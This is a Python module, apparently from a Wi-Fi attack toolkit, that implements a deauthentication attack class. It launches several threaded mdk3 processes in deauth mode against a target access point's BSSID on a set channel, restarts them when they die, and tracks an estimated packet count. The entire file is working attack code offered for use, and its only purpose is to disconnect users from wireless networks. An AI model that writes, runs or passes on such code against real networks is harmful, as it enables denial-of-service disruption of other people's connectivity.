"""
Deauthentication attack module
"""

import subprocess
import threading
import time
import signal
import os
import select
from typing import Optional, Dict, List
from rich.console import Console

from src.logger import get_logger
from src.utils import run_command

console = Console()
logger = get_logger(__name__)

class DeauthAttacker:
    """Perform deauthentication attacks"""
    
    def __init__(self, interface: str, config: Dict):
        self.interface = interface
        self.config = config
        self.processes: List[subprocess.Popen] = []
        self.running = False
        self.packets_sent = 0
        self.attack_threads: List[threading.Thread] = []
        self.target_bssid = None
        self.channel = None
        self.packet_rate = 1000  # Default packet rate
        self.process_restart_delay = 2  # Seconds to wait before restarting
        self.stop_event = threading.Event()
        
    def start_attack(self, target_bssid: str, channel: int, packet_rate: int = 1000):
        """Start deauth attack on target"""
        self.target_bssid = target_bssid
        self.channel = channel
        self.packet_rate = packet_rate
        self.running = True
        self.stop_event.clear()
        
        # Set channel
        self.set_channel(channel)
        
        console.print(f"[yellow]Starting attack on {target_bssid} (Channel {channel})[/yellow]")
        console.print(f"[dim]Packet rate: {packet_rate} packets/sec[/dim]")
        
        # Calculate number of threads based on packet rate
        # Each mdk3 instance can handle about 200-300 packets/sec effectively
        num_threads = max(1, min(3, packet_rate // 250))
        packets_per_thread = packet_rate // num_threads
        
        # Start attack threads
        for i in range(num_threads):
            thread = threading.Thread(
                target=self._attack_loop,
                args=(target_bssid, channel, packets_per_thread, i),
                daemon=True
            )
            thread.start()
            self.attack_threads.append(thread)
            
        logger.info(f"Attack started on {target_bssid} with {num_threads} threads")
        
    def _attack_loop(self, target_bssid: str, channel: int, thread_rate: int, thread_id: int):
        """Attack loop for each thread"""
        process = None
        restart_count = 0
        
        while self.running and not self.stop_event.is_set():
            try:
                # Use mdk3 for deauth
                cmd = [
                    "sudo", "mdk3",
                    self.interface,
                    "d",  # deauth mode
                    "-c", str(channel)
                ]
                
                # Add target BSSID
                cmd.extend(["-m", target_bssid])
                
                # Add packet rate - mdk3 uses -s for delay in microseconds
                if thread_rate > 0:
                    # Convert packets/sec to microseconds delay
                    delay = max(50, min(5000, int(1000000 / (thread_rate * 2))))
                    cmd.extend(["-s", str(delay)])
                
                logger.debug(f"Thread {thread_id} starting mdk3 with command: {' '.join(cmd)}")
                
                # Start process
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL
                )
                
                self.processes.append(process)
                
                # Monitor process
                packets_per_loop = thread_rate // 10  # Update every 0.1 seconds
                
                while self.running and not self.stop_event.is_set() and process.poll() is None:
                    self.packets_sent += packets_per_loop
                    time.sleep(0.1)
                
                # Check if process died
                if process.poll() is not None and self.running and not self.stop_event.is_set():
                    logger.warning(f"Thread {thread_id} mdk3 died, restarting...")
                    time.sleep(self.process_restart_delay)
                    continue
                else:
                    break  # Exit loop if stopped
                        
            except Exception as e:
                logger.error(f"Thread {thread_id} error: {e}")
                if self.running and not self.stop_event.is_set():
                    time.sleep(self.process_restart_delay)
                    continue
                else:
                    break
                    
    def set_channel(self, channel: int):
        """Set interface to specific channel"""
        try:
            # Try multiple methods to set channel
            methods = [
                ["sudo", "iwconfig", self.interface, "channel", str(channel)],
                ["sudo", "iw", "dev", self.interface, "set", "channel", str(channel)],
            ]
            
            for method in methods:
                try:
                    result = subprocess.run(
                        method,
                        check=False,
                        capture_output=True,
                        timeout=5,
                        text=True
                    )
                    if result.returncode == 0:
                        logger.info(f"Channel set to {channel}")
                        time.sleep(1)  # Give time for channel change
                        return True
                except:
                    continue
                    
        except Exception as e:
            logger.error(f"Error setting channel: {e}")
            
    def stop_attack(self):
        """Stop all attacks"""
        console.print("[yellow]Stopping attack...[/yellow]")
        
        # Set stop event
        self.stop_event.set()
        self.running = False
        
        # Terminate all processes
        for process in self.processes:
            try:
                process.terminate()
                try:
                    process.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    process.kill()
            except:
                pass
                
        self.processes.clear()
        
        # Wait for threads to finish
        for thread in self.attack_threads:
            thread.join(timeout=3)
            
        self.attack_threads.clear()
        
        # Try to reset channel but don't show errors
        try:
            subprocess.run(
                ["sudo", "iwconfig", self.interface, "channel", "auto"],
                check=False,
                timeout=5,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except:
            pass  # Silently ignore channel reset errors
            
        logger.info(f"Attack stopped. Total packets sent: {self.packets_sent}")
        console.print(f"[green]✓ Attack stopped. Packets sent: {self.packets_sent:,}[/green]")
        
    def is_running(self) -> bool:
        """Check if attack is running"""
        if not self.running or self.stop_event.is_set():
            return False
            
        # Check if any processes are still running
        self.processes = [p for p in self.processes if p.poll() is None]
        return len(self.processes) > 0
        
    def get_status(self) -> Dict:
        """Get attack status"""
        active_processes = sum(1 for p in self.processes if p.poll() is None)
        return {
            'running': self.is_running(),
            'packets_sent': self.packets_sent,
            'processes': active_processes,
            'target': self.target_bssid,
            'channel': self.channel
        }
        
    def get_packet_rate(self) -> int:
        """Get current packet rate"""
        return self.packet_rate
        
    def set_packet_rate(self, rate: int):
        """Adjust packet rate during attack"""
        self.packet_rate = rate
        # Note: Changing rate on the fly would require restarting processes
        # For simplicity, we'll just update the variable
        logger.info(f"Packet rate updated to {rate}")